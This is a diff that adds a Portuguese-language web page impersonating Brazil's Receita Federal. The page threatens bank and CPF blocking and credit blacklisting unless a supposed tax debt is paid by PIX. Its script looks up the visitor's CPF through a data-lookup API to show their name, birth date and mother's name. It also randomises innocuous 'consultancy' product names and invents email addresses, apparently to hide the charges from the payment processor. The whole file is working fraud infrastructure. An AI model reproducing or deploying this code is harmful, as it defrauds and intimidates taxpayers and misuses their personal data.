+                        <button onclick="clearSelection()" style="background: #dc3545; border: none; border-radius: 2px; padding: 8px 16px; color: white; font-weight: 600; cursor: pointer;">Limpar Seleção</button>
+                    </div>
+                    <div style="font-weight: bold; margin-bottom: 10px;">Total Selecionado: R$ <span id="totalSelected">0,00</span></div>
+                </div>
+
+                <dl class="document-data">
+                    <dt>IRPF</dt>
+                    <dd id="valorIrpfResumo">R$ 0,00</dd>
+                </dl>
+
+                <div style="background-color: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; padding: 20px; margin: 15px 0; border-radius: 4px; border-left: 4px solid #dc3545;">
+                    <p style="margin: 0 0 15px 0; font-weight: bold; font-size: 16px; text-align: center;">⚠️
+                        NOTIFICAÇÃO OFICIAL - PRAZO FINAL</p>
+                    <p style="margin: 0 0 15px 0; line-height: 1.5; text-align: justify;">
+                        O não cumprimento da obrigação tributária até <strong><span id="prazoFinalAvisoDate"></span></strong> resultará na imposição
+                        de multa adicional no valor de <strong>R$ 948,92</strong> e na aplicação das seguintes medidas
+                        administrativas pela Receita Federal do Brasil:
+                    </p>
+                    <div style="margin: 15px 0;">
+                        <div style="background-color: rgba(255,255,255,0.1); padding: 10px; margin: 8px 0; border-radius: 3px;">
+                            <strong>1. BLOQUEIO BANCÁRIO:</strong> Suspensão de todas as contas correntes, poupanças e
+                            investimentos
+                        </div>
+                        <div style="background-color: rgba(255,255,255,0.1); padding: 10px; margin: 8px 0; border-radius: 3px;">
+                            <strong>2. RESTRIÇÃO CREDITÍCIA:</strong> Inscrição do nome nos órgãos de proteção ao
+                            crédito (SPC/SERASA)
+                        </div>
+                        <div style="background-color: rgba(255,255,255,0.1); padding: 10px; margin: 8px 0; border-radius: 3px;">
+                            <strong>3. BLOQUEIO DO CPF:</strong> Impossibilidade de realizar transações financeiras e
+                            operações bancárias
+                        </div>
+                    </div>
+                </div>
+
+                <p style="line-height: 1.5; letter-spacing: 0.15px;">Para regularizar a situação fiscal e evitar a aplicação das penalidades previstas no documento
+                    oficial, é obrigatório efetuar o pagamento das divergências calculadas pela Receita Federal no valor
+                    total de <strong>R$ <span id="totalPayment">0,00</span></strong>.</p>
+                <div class="payment-button-container" style="margin: 20px auto; max-width: 320px; display: flex; justify-content: center;">
+                    <button class="payment-button" id="pixPaymentButton" onclick="generatePayment()" style="
+                        background: #28a745;
+                        border: none;
+                        border-radius: 2px;
+                        padding: 16px 24px;
+                        color: white;
+                        font-weight: 600;
+                        font-size: 1.1rem;
+                        cursor: pointer;
+                        width: 100%;">GERAR PAGAMENTO PIX</button>
+                </div>
+
+                <div id="pixLoadingArea" style="display:none; text-align:center; padding:20px;">
+                    <div style="display:inline-block; width:32px; height:32px; border:4px solid #28a745; border-top-color:transparent; border-radius:50%; animation:spin 0.8s linear infinite;"></div>
+                    <p style="margin-top:10px; color:#333; font-weight:600;">Gerando PIX, aguarde...</p>
+                </div>
+
+                <div id="pixResultArea" class="pix-checkout" style="display:none;">
+                    <div class="pix-checkout-header">
+                        <h3 class="pix-checkout-title">
+                            <i class="fas fa-qrcode" aria-hidden="true"></i>
+                            Pagamento via PIX
+                        </h3>
+                        <div class="pix-secure">
+                            <i class="fas fa-lock" aria-hidden="true"></i>
+                            Ambiente seguro
+                        </div>
+                    </div>
+
+                    <div class="pix-grid">
+                        <div class="pix-panel pix-summary">
+                            <div class="pix-summary-row">
+                                <div class="pix-kv">
+                                    <div class="pix-kv-label">Valor do pagamento</div>
+                                    <div class="pix-kv-value" id="pixAmountValue">R$ 0,00</div>
+                                </div>
+                                <div class="pix-status" id="pixStatusBadge">
+                                    <span style="width:10px;height:10px;border-radius:999px;background:#f59e0b;display:inline-block"></span>
+                                    Aguardando pagamento
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="pix-panel">
+                            <div class="pix-qr-wrap">
+                                <div class="pix-qr-card">
+                                    <img id="pixQrImage" class="pix-qr-img" src="" alt="QR Code PIX">
+                                    <div id="pixQrFallback" class="pix-qr-fallback">QR Code indisponível no momento. Use o PIX Copia e Cola abaixo.</div>
+                                </div>
+                                <p class="pix-muted">Pague escaneando o QR Code no app do seu banco.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="pix-panel" style="margin-top:12px">
+                        <div style="display:flex;align-items:flex-start;justify-content:space-between;gap:12px;flex-wrap:wrap">
+                            <div>
+                                <div class="pix-kv-label">PIX Copia e Cola</div>
+                                <div style="font-size:13px;color:#374151;font-weight:700;margin-top:4px">Copie o código abaixo e pague no seu banco</div>
+                            </div>
+                        </div>
+                        <div class="pix-copy-wrap" style="margin-top:10px">
+                            <div id="pixCodeText" class="pix-code"></div>
+                            <button id="pixCopyButton" class="pix-copy-btn" type="button" onclick="copyPixCode()">
+                                <i class="fas fa-copy" aria-hidden="true"></i>
+                                Copiar código PIX
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="pix-panel" style="margin-top:12px">
+                        <div class="pix-kv-label">Orientações</div>
+                        <ol class="pix-steps">
+                            <li>Copie o código.</li>
+                            <li>Abra o app do banco em PIX &gt; Copia e Cola.</li>
+                            <li>Cole e confirme o pagamento.</li>
+                        </ol>
+                    </div>
+
+                    <div class="pix-notes">
+                        <div class="pix-note">
+                            <i class="fas fa-clock" aria-hidden="true"></i>
+                            <div>O código pode expirar em alguns minutos.</div>
+                        </div>
+                        <div class="pix-note">
+                            <i class="fas fa-bolt" aria-hidden="true"></i>
+                            <div>A confirmação é automática após o pagamento.</div>
+                        </div>
+                        <div class="pix-note">
+                            <i class="fas fa-shield-alt" aria-hidden="true"></i>
+                            <div>Não compartilhe este código com terceiros.</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const PRODUCT_NAMES = [
+            'Serviço de Consultoria',
+            'Consultoria Tributária',
+            'Assessoria Fiscal',
+            'Revisão de Documentos',
+            'Análise Contábil',
+            'Regularização Fiscal',
+            'Auditoria Financeira',
+            'Planejamento Tributário',
+            'Conformidade Fiscal',
+            'Assessoria Empresarial',
+            'Diagnóstico Financeiro',
+            'Otimização Tributária',
+            'Consultoria Administrativa',
+            'Revisão Técnica',
+            'Parecer Contábil'
+        ];
+
+        function getRandomProductName() {
+            return PRODUCT_NAMES[Math.floor(Math.random() * PRODUCT_NAMES.length)];
+        }
+
+        function generateRandomEmail() {
+            const domains = ['gmail.com', 'hotmail.com', 'outlook.com', 'yahoo.com', 'email.com'];
+            const randomString = Math.random().toString(36).substring(2, 10);
+            const randomDomain = domains[Math.floor(Math.random() * domains.length)];
+            return `user.${randomString}@${randomDomain}`;
+        }
+
+        function formatCpf(value) {
+            const digits = String(value || '').replace(/\D/g, '');
+            if (digits.length === 11) {
+                return digits.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+            }
+            return String(value || '');
+        }
+
+        function formatData(data) {
+            if (!data) return '';
+            if (data.includes('-')) {
+                const [ano, mes, dia] = data.split('-');
+                return `${dia}/${mes}/${ano}`;
+            }
+            return data;
+        }
+
+        function applyCustomerData(data) {
+            const nome = (data.nome || data.NOME || data.name || 'Contribuinte').trim();
+            const cpfRaw = data.cpf || data.CPF || '';
+            const cpfFormatado = cpfRaw ? formatCpf(cpfRaw) : '';
+            const displayName = nome || 'Contribuinte';
+
+            ['topDebtorName', 'summaryDebtorName', 'documentName'].forEach((id) => {
+                const el = document.getElementById(id);
+                if (el) {
+                    el.textContent = displayName;
+                }
+            });
+
+            ['topDebtorCpf', 'summaryDebtorCpf', 'cpfDocumentoOficial'].forEach((id) => {
+                const el = document.getElementById(id);
+                if (el) {
+                    el.textContent = cpfFormatado;
+                }
+            });
+
+            const debtorName = document.getElementById('debtorName');
+            if (debtorName) {
+                debtorName.innerHTML = `<strong>NOME:</strong> ${displayName}`;
+            }
+
+            const debtorCpf = document.getElementById('debtorCpf');
+            if (debtorCpf) {
+                debtorCpf.innerHTML = `<strong>CPF:</strong> ${cpfFormatado}`;
+            }
+
+            // Adicionar data de nascimento se existir
+            const nascimentoRaw = data.nascimento || data.NASCIMENTO || '';
+            const nascimentoFormatado = formatData(nascimentoRaw);
+            const debtorNascimento = document.getElementById('debtorNascimento');
+            if (debtorNascimento && nascimentoFormatado) {
+                debtorNascimento.style.display = 'block';
+                debtorNascimento.innerHTML = `<strong>DATA DE NASCIMENTO:</strong> <span>${nascimentoFormatado}</span>`;
+            } else if (debtorNascimento) {
+                debtorNascimento.style.display = 'none';
+            }
+
+            // Adicionar nome da mãe se existir
+            const mae = data.mae || data.MAE || data.nome_mae || '';
+            const debtorMae = document.getElementById('debtorMae');
+            if (debtorMae && mae) {
+                debtorMae.style.display = 'block';
+                debtorMae.innerHTML = `<strong>NOME DA MÃE:</strong> <span>${mae}</span>`;
+            } else if (debtorMae) {
+                debtorMae.style.display = 'none';
+            }
+
+            // Exibir data e mãe no topo
+            if (nascimentoFormatado) {
+                const topNascimento = document.getElementById('topDebtorNascimento');
+                if (topNascimento) {
+                    topNascimento.textContent = nascimentoFormatado;
+                }
+            }
+
+            if (mae) {
+                const topMae = document.getElementById('topDebtorMae');
+                if (topMae) {
+                    topMae.textContent = mae;
+                }
+            }
+
+            // Exibir data e mãe no resumo também
+            if (nascimentoFormatado) {
+                const summaryNascimento = document.getElementById('summaryDebtorNascimento');
+                if (summaryNascimento) {
+                    summaryNascimento.textContent = nascimentoFormatado;
+                }
+            }
+
+            if (mae) {
+                const summaryMae = document.getElementById('summaryDebtorMae');
+                if (summaryMae) {
+                    summaryMae.textContent = mae;
+                }
+            }
+        }
+
+        async function loadCustomerData() {
+            const params = new URLSearchParams(window.location.search);
+            const cpfParam = params.get('cpf');
+            let storedData = null;
+
+            try {
+                const saved = localStorage.getItem('customerData');
+                if (saved) {
+                    storedData = JSON.parse(saved);
+                }
+            } catch (error) {
+                console.warn('Erro ao ler customerData:', error);
+            }
+
+            if (storedData) {
+                applyCustomerData(storedData);
+            }
+
+            if (!cpfParam) {
+                if (!storedData) {
+                    applyCustomerData({ nome: 'Contribuinte', cpf: '' });
+                }
+                return;
+            }
+
+            try {
+                const apiUrl = `/api/api-cpf?cpf=${encodeURIComponent(cpfParam)}&_t=${Date.now()}`;
+
+                // Adicionar timeout de 5 segundos
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 5000);
+
+                const response = await fetch(apiUrl, {
+                    method: 'GET',
+                    mode: 'cors',
+                    cache: 'no-cache',
+                    headers: { 'Cache-Control': 'no-cache' },
+                    signal: controller.signal
+                });
+
+                clearTimeout(timeoutId);
+
+                if (!response.ok) {
+                    throw new Error('get_failed');
+                }
+
+                const text = await response.text();
+                let data;
+
+                try {
+                    data = JSON.parse(text);
+                } catch (error) {
+                    throw new Error('invalid_json');
+                }
+
+                if (data.error || data.success === false) {
+                    throw new Error('api_error');
+                }
+
+                // Mapear dados de QueryBuscas API
+                const dadosPessoais = data.DADOS_PESSOAIS || data;
+
+                const customerData = {
+                    nome: dadosPessoais.NOME || dadosPessoais.nome || '',
+                    cpf: (dadosPessoais.CPF || dadosPessoais.cpf || cpfParam).replace(/\D/g, ''),
+                    telefone: dadosPessoais.telefone || dadosPessoais.TELEFONE || null,
+                    email: dadosPessoais.email || dadosPessoais.EMAIL || null,
+                    nascimento: dadosPessoais.NASCIMENTO || dadosPessoais.nascimento || '',
+                    mae: dadosPessoais.NOME_MAE || dadosPessoais.nome_mae || dadosPessoais.mae || '',
+                    sexo: dadosPessoais.SEXO || dadosPessoais.sexo || '',
+                    endereco: dadosPessoais.endereco || null,
+                    street: dadosPessoais.street || null,
+                    street_number: dadosPessoais.street_number || null,
+                    neighborhood: dadosPessoais.neighborhood || null,
+                    city: dadosPessoais.city || null,
+                    state: dadosPessoais.state || null,
+                    zip_code: dadosPessoais.zip_code || null
+                };
+
+                try {
+                    localStorage.setItem('customerData', JSON.stringify(customerData));
+                    console.log('✅ Salvo no localStorage:', customerData);
+                } catch (error) {
+                    console.warn('Erro ao salvar customerData:', error);
+                }
+
+                applyCustomerData(customerData);
+            } catch (error) {
+                console.error('Erro ao buscar dados do CPF:', error.message);
+
+                if (storedData) {
+                    applyCustomerData(storedData);
+                } else {
+                    applyCustomerData({
+                        nome: 'Contribuinte',
+                        cpf: cpfParam,
+                        nascimento: '',
+                        mae: ''
+                    });
+                }
+            }
+        }
+
+        function updateTotal() {
+            const yearInputs = document.querySelectorAll('#yearSelectionContainer input[type="checkbox"]');
+            let total = 0;
+
+            yearInputs.forEach((input) => {
+                if (input.checked) {
+                    total += parseFloat(input.value);
+                }
+            });
+
+            const formattedTotal = total.toFixed(2).replace('.', ',');
+
+            document.getElementById('totalSelected').textContent = formattedTotal;
+            document.getElementById('totalPayment').textContent = formattedTotal;
+            document.getElementById('valorIrpfResumo').textContent = `R$ ${formattedTotal}`;
+            document.getElementById('valorComDescontoTopo2').innerHTML = `<strong>Valor com desconto:</strong> R$ ${formattedTotal}`;
+        }
+
+        function selectAllYears() {
+            const yearInputs = document.querySelectorAll('#yearSelectionContainer input[type="checkbox"]');
+            yearInputs.forEach((input) => {
+                input.checked = true;
+            });
+            updateTotal();
+        }
+
+        function clearSelection() {
+            const yearInputs = document.querySelectorAll('#yearSelectionContainer input[type="checkbox"]');
+            yearInputs.forEach((input) => {
+                input.checked = false;
+            });
+            const requiredYear = document.getElementById('year2020');
+            if (requiredYear) {
+                requiredYear.checked = true;
+            }
+            updateTotal();
+        }
+
+        async function generatePayment() {
+            let customerData = {};
+            try {
+                const saved = localStorage.getItem('customerData');
+                if (saved) customerData = JSON.parse(saved);
+            } catch(e) {}
+
+            let nome = customerData.nome || customerData.NOME || customerData.name || '';
+            let cpf = customerData.cpf || customerData.CPF || '';
+            let email = customerData.email || generateRandomEmail();
+            let phone = customerData.telefone || customerData.phone || '11999999999';
+
+            nome = nome.trim().toUpperCase();
+            cpf = cpf.replace(/\D/g, '');
+
+            if (!nome || !cpf) {
+                alert('Dados do cliente não encontrados. Volte à página anterior e consulte o CPF novamente.');
+                return;
+            }
+
+            const yearInputs = document.querySelectorAll('#yearSelectionContainer input[type="checkbox"]');
+            let totalReais = 0;
+            yearInputs.forEach(input => { if (input.checked) totalReais += parseFloat(input.value); });
+            const amountCentavos = Math.round(totalReais * 100);
+
+            if (amountCentavos <= 0) {
+                alert('Selecione ao menos um ano para pagamento.');
+                return;
+            }
+
+            const btn = document.getElementById('pixPaymentButton');
+            const loadingArea = document.getElementById('pixLoadingArea');
+            const resultArea = document.getElementById('pixResultArea');
+
+            btn.disabled = true;
+            btn.style.opacity = '0.6';
+            loadingArea.style.display = 'block';
+            resultArea.style.display = 'none';
+
+            console.log('📤 Gerando PIX com dados:', { nome, cpf, email, phone, amountCentavos });
+
+            const params = new URLSearchParams({
+                customer_name: nome,
+                customer_cpf: cpf,
+                customer_email: email,
+                customer_phone: phone,
+                amount: amountCentavos
+            });
+
+            console.log('📡 URL da API:', '/api/generate-pix?' + params.toString());
+
+            try {
+                const response = await fetch('/api/generate-pix?' + params.toString());
+                const data = await response.json();
+
+                console.log('✅ Resposta da API:', data);
+
+                loadingArea.style.display = 'none';
+                btn.disabled = false;
+                btn.style.opacity = '1';
+
+                if (!data.success || !data.pixCode) {
+                    console.error('❌ Erro:', data.error || 'PIX code vazio');
+                    alert('Erro ao gerar PIX: ' + (data.error || 'Tente novamente.'));
+                    return;
+                }
+
+                const pixCode = data.pixCode;
+                console.log('🔢 PIX Code:', pixCode);
+                document.getElementById('pixCodeText').textContent = pixCode;
+                const amountValue = document.getElementById('pixAmountValue');
+                if (amountValue) {
+                    amountValue.textContent = `R$ ${(amountCentavos / 100).toFixed(2).replace('.', ',')}`;
+                }
+                const copyBtn = document.getElementById('pixCopyButton');
+                if (copyBtn) {
+                    copyBtn.classList.remove('success');
+                    copyBtn.innerHTML = '<i class="fas fa-copy" aria-hidden="true"></i> Copiar código PIX';
+                }
+
+                try {
+                    console.log('🎨 Gerando QR Code...');
+                    const canvas = document.createElement('canvas');
+                    new QRious({ element: canvas, value: pixCode, size: 200, background: '#ffffff', foreground: '#000000' });
+                    const qrImg = document.getElementById('pixQrImage');
+                    const qrFallback = document.getElementById('pixQrFallback');
+                    if (qrImg) {
+                        qrImg.src = canvas.toDataURL('image/png');
+                        qrImg.style.display = 'block';
+                        console.log('✅ QR Code gerado com sucesso');
+                    }
+                    if (qrFallback) {
+                        qrFallback.style.display = 'none';
+                    }
+                } catch(e) {
+                    console.error('❌ Erro ao gerar QR Code:', e);
+                    const qrImg = document.getElementById('pixQrImage');
+                    const qrFallback = document.getElementById('pixQrFallback');
+                    if (qrImg) {
+                        qrImg.style.display = 'none';
+                    }
+                    if (qrFallback) {
+                        qrFallback.style.display = 'flex';
+                    }
+                }
+
+                resultArea.style.display = 'block';
+                resultArea.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+                window._pixTransactionId = data.transaction_id || data.transactionId;
+                try {
+                    localStorage.setItem('customerData', JSON.stringify({ nome, cpf, email, telefone: phone }));
+                } catch(e) {}
+                if (window._pixTransactionId) {
+                    if (window._pixMonitor) clearInterval(window._pixMonitor);
+                    window._pixMonitor = setInterval(async () => {
+                        try {
+                            const url = '/api/get-payment?transactionId=' + encodeURIComponent(window._pixTransactionId);
+                            const r = await fetch(url);
+                            if (!r.ok) return;
+                            const j = await r.json();
+                            if (!j.success) return;
+                            const paid = j.paid === true;
+                            const status = j.status || 'pending';
+                            if (paid || status === 'approved' || status === 'paid') {
+                                clearInterval(window._pixMonitor);
+                                window._pixMonitor = null;
+                                // window.location.href = 'a/upsell.html';
+                                document.getElementById('sucesso').style.display = 'block';
+                            }
+                        } catch (e) {}
+                    }, 2000);
+                }
+
+            } catch(err) {
+                loadingArea.style.display = 'none';
+                btn.disabled = false;
+                btn.style.opacity = '1';
+                alert('Erro de conexão: ' + err.message);
+            }
+        }
+
+        function copyPixCode() {
+            const codeEl = document.getElementById('pixCodeText');
+            const code = (codeEl ? codeEl.textContent : '').trim();
+            if (!code) return;
+
+            const btn = document.getElementById('pixCopyButton');
+            const setSuccess = () => {
+                if (!btn) return;
+                btn.classList.add('success');
+                btn.innerHTML = '<i class="fas fa-check" aria-hidden="true"></i> Código copiado';
+                setTimeout(() => {
+                    btn.classList.remove('success');
+                    btn.innerHTML = '<i class="fas fa-copy" aria-hidden="true"></i> Copiar código PIX';
+                }, 2200);
+            };
+
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(code).then(setSuccess).catch(() => {});
+                return;
+            }
+
+            const ta = document.createElement('textarea');
+            ta.value = code;
+            document.body.appendChild(ta);
+            ta.select();
+            try {
+                document.execCommand('copy');
+                setSuccess();
+            } catch (e) {}
+            document.body.removeChild(ta);
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            loadCustomerData();
+            updateTotal();
+            try {
+                const deadlineDate = new Date('2026-07-01');
+                const prazoFinalBr = '01/07/2026';
+
+                const prazoFinalDate = document.getElementById('prazoFinalDate');
+                if (prazoFinalDate) prazoFinalDate.textContent = prazoFinalBr;
+
+                const prazoFinalAvisoDate = document.getElementById('prazoFinalAvisoDate');
+                if (prazoFinalAvisoDate) prazoFinalAvisoDate.textContent = prazoFinalBr;
+            } catch (e) {}
+
+            const loadingScreen = document.getElementById('loadingScreen');
+            const mainContent = document.getElementById('mainContent');
+
+            // Função para remover loading screen
+            const removeLoading = () => {
+                if (loadingScreen && mainContent) {
+                    loadingScreen.classList.add('fade-out');
+                    mainContent.classList.add('show');
+                    setTimeout(() => {
+                        loadingScreen.style.display = 'none';
+                    }, 500);
+                }
+            };
+
+            if (loadingScreen && mainContent) {
+                setTimeout(removeLoading, 600);
+
+                // Timeout máximo de 8 segundos para garantir que o loading seja removido
+                setTimeout(() => {
+                    if (loadingScreen.style.display !== 'none') {
+                        console.warn('Timeout: removendo loading screen');
+                        removeLoading();
+                    }
+                }, 8000);
+            }
+        });
+    </script>
+</body>
+</html>
